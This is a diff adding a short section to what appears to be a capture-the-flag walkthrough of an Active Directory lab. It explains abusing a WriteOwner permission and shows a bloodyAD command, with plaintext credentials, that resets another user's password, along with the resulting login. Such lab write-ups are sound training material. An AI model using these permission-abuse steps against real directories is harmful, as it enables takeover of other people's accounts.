@@ -178,8 +178,14 @@ Now I controll another user!
 
 ## Using `WriteOwner` privilege to do a targeted kerberoasting on `john`
 
+Sam has the 'WriteOwner' permission on John's account. This allows him to take full control of the account, enabling him to either perform a Kerberoast attack or change the password without knowing the current one. I will directly change his password.
 
+```bash
+# bloodyAD --host DC01.tombwatcher.htb --dc-ip 10.10.11.72 -d tombwatcher.htb -u sam -p Bagu3tte set password "john" "Bagu3tte"
+[+] Password changed successfully!
+```
 
+`john:Bagu3tte`
 
 
 
